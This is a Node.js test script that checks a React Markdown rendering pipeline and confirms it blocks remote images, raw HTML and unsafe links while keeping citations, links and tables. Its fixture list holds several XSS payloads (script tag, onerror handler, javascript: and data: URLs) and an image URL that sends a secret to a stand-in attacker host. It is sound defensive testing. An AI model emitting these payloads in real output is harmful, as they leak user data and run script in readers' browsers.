// Real ESM Markdown pipeline, complementing Jest's UI mocks. Run from frontend/.
import assert from 'node:assert/strict';
import { readFile, writeFile, mkdir, rm } from 'node:fs/promises';
import { pathToFileURL } from 'node:url';
import { resolve } from 'node:path';
import ts from 'typescript';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeHighlight from 'rehype-highlight';

const directory = resolve('.local/phase20-markdown-check');
await mkdir(directory, { recursive: true });
try {
  for (const name of ['answer-images', 'citations']) {
    const source = await readFile(`src/lib/${name}.ts`, 'utf8');
    await writeFile(`${directory}/${name}.mjs`, ts.transpileModule(source, {
      compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2020 },
    }).outputText);
  }
  const { answerImagePlaceholder } = await import(pathToFileURL(`${directory}/answer-images.mjs`));
  const { remarkCitations } = await import(pathToFileURL(`${directory}/citations.mjs`));
  const render = text => renderToStaticMarkup(React.createElement(Markdown, {
    skipHtml: true, remarkPlugins: [remarkGfm, [remarkCitations, { citationIds: [1] }]],
    rehypePlugins: [rehypeHighlight], components: { img: answerImagePlaceholder },
  }, text));
  for (const text of [
    '![private image](https://attacker.invalid/collect?secret=PRIVATE)',
    '![inline](data:image/svg+xml;base64,PHN2Zz4=)',
    '<img src="https://attacker.invalid" onerror="alert(1)">',
    '<script>alert(1)</script>',
    '[unsafe](javascript:alert%281%29)',
    '[unsafe](data:text/html;base64,PHNjcmlwdD4=)',
  ]) {
    const html = render(text);
    assert(!/<img|<script|onerror=|href="(?:javascript:|data:)|attacker\.invalid/i.test(html), html);
  }
  assert.match(render('Supported claim [1].'), /href="#citation-1"/);
  assert.match(render('[Normal link](https://example.com)'), /href="https:\/\/example.com"/);
  assert.match(render('| Study | Finding |\n| --- | --- |\n| A | Safe |'), /<table>/);
  console.log('PASS: real Markdown pipeline blocks remote images/raw HTML/unsafe URLs; citations, links and tables preserved.');
} finally {
  // Only compiler artifacts created by this script, never application data.
  for (const name of ['answer-images', 'citations']) await rm(`${directory}/${name}.mjs`, { force: true });
}
